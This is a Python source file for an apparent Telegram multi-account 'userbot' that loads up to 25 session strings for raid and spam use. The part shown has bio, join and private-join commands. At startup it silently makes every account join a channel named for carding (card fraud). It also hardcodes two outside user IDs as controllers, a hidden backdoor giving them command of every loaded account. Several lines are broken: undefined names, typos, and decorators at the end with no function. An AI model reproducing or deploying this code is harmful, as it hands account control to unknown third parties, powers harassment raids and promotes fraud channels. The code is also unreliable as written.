import os
import sys
import random
from datetime import datetime
from os import execl
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from Config import STRING, SUDO, BIO_MESSAGE, ALIVE_IMAGE, ALIVE_NAME, API_ID, API_HASH, HEROKU_APP_NAME, HEROKU_API_KEY, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12 , STRING13 , STRING14 , STRING15 ,STRING16 , STRING17 , STRING18 , STRING19 , STRING20 , STRING21 , STRING22 , STRING23 , STRING24 , STRING25 
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Utils import RAID, RRAID, MRAID, SRAID, JRAID, PORNSPAM, CRAID, OWORD, HRAID
from telethon.tl.functions.channels import JoinChannelRequest

import heroku3
from telethon.tl.functions.users import GetFullUserRequest

Heroku = heroku3.from_key(HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
sudousers = os.environ.get("SUDO", None)

a = API_ID
b = API_HASH
smex = STRING
smexx = STRING2
smexxx = STRING3
smexxxx = STRING4
smexxxxx = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9
tenth = STRING10
eleve = STRING11
twelv = STRING12
thirt = STRING13
forte = STRING14
fifth = STRING15
sieee = STRING16
seeee = STRING17
eieee = STRING18
nieee = STRING19
gandu = STRING20
ekish = STRING21
baish = STRING22
teish = STRING23
tfour = STRING24
tfive = STRING25


idk = ""
ydk = ""
wdk = ""
sdk = ""
hdk = ""
adk = ""
bdk = ""
cdk = ""
edk = ""
ddk = ""
vkk = ""
kkk = ""
lkk = ""
mkk = ""
sid = ""
shy = ""
aan = ""
ake = ""
eel = ""
khu = ""
shi = ""
yaa = ""
dav = ""
raj = ""
put = ""


que = {}

SMEX_USERS = [1195997736, 6895470102]
for x in SUDO: 
    SMEX_USERS.append(x)
    
async def start_yukki():
    global idk
    global ydk
    global wdk
    global sdk
    global hdk
    global adk
    global bdk
    global cdk
    global ddk
    global edk
    global vkk
    global kkk
    global lkk
    global mkk
    global sid
    global shy
    global aan
    global ake
    global eel
    global khu
    global shi
    global yaa
    global dav
    global raj
    global put
    
    if smex:
        session_name = str(smex)
        print("String 1 Found")
        idk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await idk.start()
            botme = await idk.get_me()
            await idk(functions.channels.JoinChannelRequest(channel="@Mr_Mrs_Krishna"))
            await idk(functions.channels.JoinChannelRequest(channel="@Mr_Mrs_Krishna"))
            await idk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await idk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            idk = "smex"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "startup"
        idk = TelegramClient(session_name, a, b)
        try:
            await idk.start()
        except Exception as e:
            pass
   
    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        ydk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await ydk.start()
            await ydk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ydk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ydk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ydk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await ydk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "startup"
        ydk = TelegramClient(session_name, a, b)
        try:
            await ydk.start()
        except Exception as e:
            pass

    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        wdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await  wdk.start()
            await wdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await wdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await wdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await wdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await wdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "startup"
        wdk = TelegramClient(session_name, a, b)
        try:
            await wdk.start()
        except Exception as e:
            pass

    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        hdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await hdk.start()
            await hdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await hdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await hdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await hdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await hdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "startup"
        hdk = TelegramClient(session_name, a, b)
        try:
            await hdk.start()
        except Exception as e:
            pass

    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        sdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await sdk.start()
            await sdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await sdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await sdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await sdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await sdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "startup"
        sdk = TelegramClient(session_name, a, b)
        try:
            await sdk.start()
        except Exception as e:
            pass
                  
    if sixth:
        session_name = str(sixth)
        print("String 6 Found")
        adk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await adk.start()
            await adk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await adk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await adk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await adk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await adk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "startup"
        adk = TelegramClient(session_name, a, b)
        try:
            await adk.start()
        except Exception as e:
            pass

    if seven:
        session_name = str(seven)
        print("String 7 Found")
        bdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await bdk.start()
            await bdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await bdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await bdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await bdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await bdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "startup"
        bdk = TelegramClient(session_name, a, b)
        try:
            await bdk.start()
        except Exception as e:
            pass    
        
    
    if eight:
        session_name = str(eight)
        print("String 8 Found")
        cdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await cdk.start()
            await cdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await cdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await cdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await cdk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await cdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "startup"
        cdk = TelegramClient(session_name, a, b)
        try:
            await cdk.start()
        except Exception as e:
            pass   
        
    if ninth:
        session_name = str(ninth)
        print("String 9 Found")
        ddk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await ddk.start()
            await ddk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ddk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ddk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ddk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await ddk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "startup"
        ddk = TelegramClient(session_name, a, b)
        try:
            await ddk.start()
        except Exception as e:
            pass   
    
  
    if tenth:
        session_name = str(tenth)
        print("String 10 Found")
        edk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 10")
            await edk.start()
            await edk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await edk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await edk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await edk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await edk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "startup"
        edk = TelegramClient(session_name, a, b)
        try:
            await edk.start()
        except Exception as e:
            pass 
        
    
    if eleve:
        session_name = str(eleve)
        print("String 11 Found")
        vkk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 11")
            await vkk.start()
            await vkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await vkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await vkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await vkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await vkk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "startup"
        vkk = TelegramClient(session_name, a, b)
        try:
            await vkk.start()
        except Exception as e:
            pass
        
    
    if twelv:
        session_name = str(twelv)
        print("String 12 Found")
        kkk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 12")
            await kkk.start()
            await kkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await kkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await kkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await kkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "startup"
        kkk = TelegramClient(session_name, a, b)
        try:
            await kkk.start()
        except Exception as e:
            pass   
    
  
    if thirt:
        session_name = str(thirt)
        print("String 13  Found")
        lkk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 13")
            await lkk.start()
            await lkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await lkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await lkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await lkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await lkk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "startup"
        lkk = TelegramClient(session_name, a, b)
        try:
            await lkk.start()
        except Exception as e:
            pass 
        
    
    if forte:
        session_name = str(forte)
        print("String 14 Found")
        mkk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 14")
            await mkk.start()
            await mkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await mkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await mkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await mkk(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await mkk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "startup"
        mkk = TelegramClient(session_name, a, b)
        try:
            await mkk.start()
        except Exception as e:
            pass
        
    
    if fifth:
        session_name = str(fifth)
        print("String 15 Found")
        sid = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 15")
            await sid.start()
            await sid(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await sid(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await sid(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await sid(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botme = await sid.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "startup"
        sid = TelegramClient(session_name, a, b)
        try:
            await sid.start()
        except Exception as e:
            pass


    if sieee:
        session_name = str(sieee)
        print("String 16 Found")
        shy = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 16")
            await shy.start()
            botme = await shy.get_me()
            await shy(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await shy(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await shy(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await shy(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "startup"
        shy = TelegramClient(session_name, a, b)
        try:
            await shy.start()
        except Exception as e:
            pass
   
    if seeee:
        session_name = str(seeee)
        print("String 17 Found")
        aan = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 17")
            await aam.start()
            botme = await aan.get_me()
            await aan(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await aan(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await aan(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await aan(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "startup"
        aan = TelegramClient(session_name, a, b)
        try:
            await aan.start()
        except Exception as e:
            pass
   
    if eieee:
        session_name = str(eieee)
        print("String 18 Found")
        ake = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 18")
            await ake.start()
            botme = await ake.get_me()
            await ake(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ake(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ake(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await ake(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "startup"
        ake = TelegramClient(session_name, a, b)
        try:
            await ake.start()
        except Exception as e:
            pass
   
    if nieee:
        session_name = str(nieee)
        print("String 19 Found")
        eel = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 19")
            await eel.start()
            botme = await eel.get_me()
            await eel(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await eel(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await eel(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await eel(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "startup"
        eel = TelegramClient(session_name, a, b)
        try:
            await idk.start()
        except Exception as e:
            pass
   
    if gandu:
        session_name = str(gandu)
        print("String 20 Found")
        khu = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 20")
            await khu.start()
            botme = await khu.get_me()
            await khu(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await khu(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await khu(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await khu(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "startup"
        khu = TelegramClient(session_name, a, b)
        try:
            await khu.start()
        except Exception as e:
            pass
   
    if ekish:
        session_name = str(ekish)
        print("String 21 Found")
        shi = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 21")
            await shi.start()
            botme = await shi.get_me()
            await shi(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await shi(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await shi(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await shi(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 21 not Found")
        session_name = "startup"
        shi = TelegramClient(session_name, a, b)
        try:
            await shi.start()
        except Exception as e:
            pass
   
    if baish:
        session_name = str(baish)
        print("String 22 Found")
        yaa = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 22")
            await yaa.start()
            botme = await yaa.get_me()
            await yaa(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await yaa(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await yaa(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await yaa(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        session_name = "startup"
        yaa = TelegramClient(session_name, a, b)
        try:
            await yaa.start()
        except Exception as e:
            pass
   
    if teish:
        session_name = str(teish)
        print("String 23 Found")
        dav = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 23")
            await dav.start()
            botme = await dav.get_me()
            await dav(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await dav(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await dav(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await dav(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        session_name = "startup"
        dav = TelegramClient(session_name, a, b)
        try:
            await dav.start()
        except Exception as e:
            pass
   
    if tfour:
        session_name = str(tfour)
        print("String 24 Found")
        raj = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 24")
            await raj.start()
            botme = await raj.get_me()
            await raj(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await raj(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await raj(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await raj(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        session_name = "startup"
        raj = TelegramClient(session_name, a, b)
        try:
            await raj.start()
        except Exception as e:
            pass
   
    if tfive:
        session_name = str(tfive)
        print("String 25 Found")
        put = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await put.start()
            botme = await put.get_me()
            await put(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await put(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await put(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            await put(functions.channels.JoinChannelRequest(channel="@Carding_Chronicle"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        session_name = "startup"
        put = TelegramClient(session_name, a, b)
        try:
            await put.start()
        except Exception as e:
            pass
   
   
loop = asyncio.get_event_loop()
loop.run_until_complete(start_yukki())       

async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception as e:
        pass
  

@idk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.bio"))

async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗼\n\nCommand:\n\n.bio <Message to set Bio of Userbot accounts>"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)     
        if len(e.text) > 5:
            bio = str(yukki[0])
            text = "HAAYE BABU KO  BIO CHANGE KARNA KOI NA KARTA ME"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.account.UpdateProfileRequest(about=bio))
                await event.edit("HAAYE MELE BABU  KA BIO CHANGE KAR DIYA MAINE")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.join")) 
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.join")) 
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.join")) 
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.join")) 
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.join")) 
@sid.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.join"))

async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = yukki[0]
            text = "UFF NEW GROUP ME JANA PADEGA RE SHAAM CHAL JALDI JALDI DHOTI THAKE BHAAG"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("RE SHYAAM KHOPDI TOD JAAKE RAJU KI UDHAR")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.pjoin")) 
@ake.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))



async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = yukki[0]
            text = "PRIVATE H RE DEVA RE DEVA UTHA LE MEKO NHI PRIVATE WALE KO UTHA LE"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit("KALYUG AAGAYA RE BABA PRIVATE ME V HEART ATTACK HONE LAGA")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

@idk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
